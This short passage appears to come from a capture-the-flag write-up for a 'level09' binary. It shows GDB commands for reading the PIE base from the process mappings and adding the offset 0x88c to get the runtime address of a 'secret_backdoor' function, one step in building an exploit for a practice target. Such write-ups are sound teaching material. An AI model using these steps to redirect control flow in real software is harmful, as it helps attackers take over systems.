## If the PIE base differs

On some VMs, the PIE base may vary. Check in GDB:

```
(gdb) break main
(gdb) run
(gdb) info proc mappings
```

Find the `level09` line with `r-xp` permissions. The start address is the PIE base. Add `0x88c` to get the runtime address of `secret_backdoor`.

